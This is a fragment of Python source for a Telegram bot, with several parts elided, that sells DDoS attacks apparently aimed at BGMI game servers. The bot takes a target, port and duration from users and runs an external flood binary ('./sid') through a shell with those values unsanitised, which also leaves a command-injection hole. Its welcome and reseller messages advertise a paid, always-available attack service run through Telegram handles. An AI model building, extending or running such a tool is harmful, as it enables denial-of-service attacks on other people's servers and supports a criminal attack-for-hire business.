    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            ...
            if time > 300:
                ...
                full_command = f"./sid {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. \nTarget: {target} \nPort: {port} \nPort: {time} OWNER:- @RAJPUTDDOS"
        else:
...
3. MAKE SURE YOU JOINED @RAJPUTDDOS1 OTHERWISE NOT WORK
...
def send_welcome(message):
   ...
   # btn3 = telebot.types.KeyboardButton('ℹ️ My Info')
    markup.add(btn1)
    bot.send_message(message.chat.id, "Welcome 😄\n Provide powerfull DDOS attack \n 27/7 available \n No cooldown \n Dm For Access :- @RAJPUTDDOS", reply_markup=markup)
...
def handle_resellership(message):
    bot.reply_to(message, "Contact @PAIDDDOSZBOT for reseller ship.")
